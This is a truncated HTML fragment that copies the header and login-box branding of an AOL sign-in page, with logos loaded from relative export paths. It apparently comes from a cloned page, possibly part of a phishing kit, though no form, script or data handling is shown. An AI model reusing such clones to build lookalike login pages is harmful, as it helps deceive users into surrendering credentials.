...
<html id="Stencil" class="js grid light-theme">
    <head>
        ...
        <link rel="shortcut icon" href="../../Export/img/aol_favicon.png" type="image/png">
        <title>AOL</title>
        <style>
    ...
    <body>
        <div id="login-body" class="loginish puree-v2 grid ">
            <div class="mbr-desktop-hd"><span class="column"><a style="cursor: pointer;"><img src="../../Export/img/aol.png" alt="AOL" class="logo " width="" height="36"><img alt="AOL" class="dark-mode-logo logo " width="" height="36"></a></span>
                <span class="column help txt-align-right"><a style="cursor: pointer;">Help</a></span>
            </div>
            <div class="login-box-container">
                <div class="login-box right">
                    <div class="mbr-login-hd txt-align-center"><img src="../../Export/img/aol.png" alt="AOL" class="logo yahoo-en-GB" width="100"><img alt="AOL" class="dark-mode-logo logo yahoo-en-GB"
                            width="" height="27"></div>
